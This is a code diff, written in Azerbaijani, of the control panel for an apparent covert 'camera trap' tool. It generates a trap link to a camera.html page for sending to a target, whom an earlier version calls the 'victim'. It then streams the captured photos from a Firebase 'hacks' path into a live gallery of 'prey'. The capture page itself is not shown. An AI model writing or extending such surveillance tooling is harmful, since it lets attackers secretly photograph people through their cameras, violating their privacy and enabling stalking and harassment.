@@ -1,64 +1,91 @@
-<div class="tool-container" style="animation: fadeIn 0.4s ease; color: white;">
-    <h2 style="color: #ff3e3e; text-align: center;"><i class="fas fa-camera"></i> Camera Trap Control</h2>
+<div class="tool-container" style="animation: fadeIn 0.4s ease-out; color: white; padding: 10px;">
+    <div style="text-align: center; margin-bottom: 25px;">
+        <h2 style="color: #ff3e3e; margin: 0;"><i class="fas fa-camera"></i> Şəxsi Camera Trap</h2>
+        <p style="font-size: 0.75rem; color: #888; margin-top: 5px;">Çəkilən şəkillər birbaşa aşağıdakı qalereyaya düşəcək.</p>
+    </div>
     
-    <div style="background: rgba(20, 20, 25, 0.8); border: 1px solid #ff3e3e; padding: 20px; border-radius: 15px; margin-bottom: 25px; text-align: center;">
-        <div id="trap-link-box" style="font-family: monospace; font-size: 0.8rem; color: #ff3e3e; word-break: break-all; margin-bottom: 15px; padding: 10px; background: rgba(0,0,0,0.4); border-radius: 8px;">
-            Link hazırlanmayıb...
+    <div style="background: rgba(255, 62, 62, 0.05); border: 1px solid rgba(255, 62, 62, 0.2); padding: 20px; border-radius: 15px; text-align: center; margin-bottom: 30px;">
+        <div id="trap-url-display" style="font-family: monospace; font-size: 0.75rem; color: #ff3e3e; background: #000; padding: 12px; border-radius: 8px; margin-bottom: 15px; border: 1px solid #222; word-break: break-all;">
+            Link yaratmaq üçün aşağıdakı düyməni sıxın
         </div>
-        <button class="btn" style="background: #ff3e3e; color: white; margin-top: 0;" onclick="generateTrapLink()">
-            <i class="fas fa-link"></i> LİNK YARAT VƏ KOPYALA
+        <button class="btn" style="background: #ff3e3e; color: white; margin: 0;" onclick="createTrapForMe()">
+            <i class="fas fa-magic"></i> TƏLƏ LİNKİ YARAT
         </button>
     </div>
 
-    <div id="trap-results">
-        <h3 style="font-size: 0.9rem; color: #eee; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px;">
-            <i class="fas fa-images"></i> Sizin Ovlarınız (Canlı)
+    <div id="my-results">
+        <h3 style="font-size: 0.9rem; color: #eee; border-left: 3px solid #ff3e3e; padding-left: 10px; margin-bottom: 15px;">
+            Mənə Gələn Şəkillər
         </h3>
-        <div id="trap-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(140px, 1fr)); gap: 15px;">
-            <div id="no-images" style="grid-column: 1/-1; text-align: center; color: #555; padding: 40px 0;">
-                Hələ ki, şəkil yoxdur. Linki göndərin və gözləyin...
+        <div id="personal-gallery" style="display: grid; grid-template-columns: repeat(auto-fill, minmax(130px, 1fr)); gap: 12px;">
+            <div id="wait-msg" style="grid-column: 1/-1; text-align: center; color: #444; padding: 30px; font-size: 0.8rem; border: 1px dashed #222; border-radius: 10px;">
+                <i class="fas fa-clock"></i> Hələ ki ovunuz yoxdur. Gözlənilir...
             </div>
         </div>
     </div>
 </div>
 
 <script>
-    // Link yaratma funksiyası
-    function generateTrapLink() {
-        // Cari URL-dən baza ünvanını tapır (məs: http://site.com/folder/)
-        let currentPath = window.location.pathname;
-        let dirPath = currentPath.substring(0, currentPath.lastIndexOf('/') + 1);
-        let finalLink = window.location.origin + dirPath + "camera.html?ref=" + loginName; 
+    // 1. Linki yaradan funksiya
+    function createTrapForMe() {
+        // index.html-dəki loginName-i götürürük
+        if (!window.loginName) {
+            alert("Sistem xətası: İstifadəçi adı tapılmadı!");
+            return;
+        }
+
+        // Cari qovluğun yolunu tapırıq
+        let loc = window.location.href;
+        let base = loc.substring(0, loc.lastIndexOf('/') + 1);
+        let finalLink = base + "camera.html?ref=" + window.loginName;
+
+        document.getElementById('trap-url-display').innerText = finalLink;
         
-        document.getElementById('trap-link-box').innerText = finalLink;
-        navigator.clipboard.writeText(finalLink);
-        alert("Tələ linki kopyalandı! Qurbana göndərin.");
+        // Avtomatik kopyala
+        const el = document.createElement('textarea');
+        el.value = finalLink;
+        document.body.appendChild(el);
+        el.select();
+        document.execCommand('copy');
+        document.body.removeChild(el);
+        
+        alert("Sizin üçün xüsusi link yaradıldı və kopyalandı!");
+        
+        // Şəkilləri izləməyə başla
+        startTrackingMyPhotos();
     }
 
-    // Şəkilləri anında (real-time) gətirmək
-    if (typeof loginName !== 'undefined') {
-        const gallery = document.getElementById('trap-gallery');
-        const noImages = document.getElementById('no-images');
+    // 2. Şəkilləri Firebase-dən birbaşa istifadəçiyə gətirən funksiya
+    function startTrackingMyPhotos() {
+        if (!window.loginName || !window.db) return;
 
-        // Firebase-də 'hacks/istifadəçi_adı' qovluğunu izləyirik
-        db.ref('hacks/' + loginName).on('value', (snapshot) => {
+        const gallery = document.getElementById('personal-gallery');
+        const waitMsg = document.getElementById('wait-msg');
+
+        // Firebase-də 'hacks/senin_adin' qovluğunu dinləyirik
+        window.db.ref('hacks/' + window.loginName).on('value', (snapshot) => {
             if (snapshot.exists()) {
-                noImages.style.display = 'none';
-                gallery.innerHTML = ""; // Köhnə siyahını təmizlə
-                
-                snapshot.forEach((childSnapshot) => {
-                    const data = childSnapshot.val();
-                    const item = document.createElement('div');
-                    item.style = "background: #111; border: 1px solid #333; border-radius: 10px; overflow: hidden; animation: zoomIn 0.3s ease;";
-                    item.innerHTML = `
-                        <img src="${data.image}" style="width: 100%; display: block; cursor: pointer;" onclick="window.open(this.src)">
-                        <div style="font-size: 0.6rem; color: #888; padding: 5px; text-align: center;">
+                waitMsg.style.display = 'none';
+                gallery.innerHTML = ""; // Köhnə siyahını sil
+
+                snapshot.forEach((child) => {
+                    const data = child.val();
+                    const card = document.createElement('div');
+                    card.style = "background: #0a0a0a; border: 1px solid #222; border-radius: 10px; overflow: hidden; animation: fadeIn 0.5s ease-out;";
+                    card.innerHTML = `
+                        <img src="${data.image}" style="width: 100%; height: 120px; object-fit: cover; cursor: pointer; display: block;" onclick="window.open(this.src)">
+                        <div style="padding: 6px; font-size: 0.6rem; color: #666; text-align: center; border-top: 1px solid #111;">
                             ${data.date.split(',')[1] || data.date}
                         </div>
                     `;
-                    gallery.prepend(item); // Yeni şəkilləri əvvələ əlavə et
+                    gallery.prepend(card); // Ən sonuncu şəkli ən başa qoy
                 });
             }
         });
+    }
+
+    // Əgər səhifə açıldıqda artıq şəkillər varsa, dərhal göstər
+    if(window.loginName) {
+        startTrackingMyPhotos();
     }
 </script>
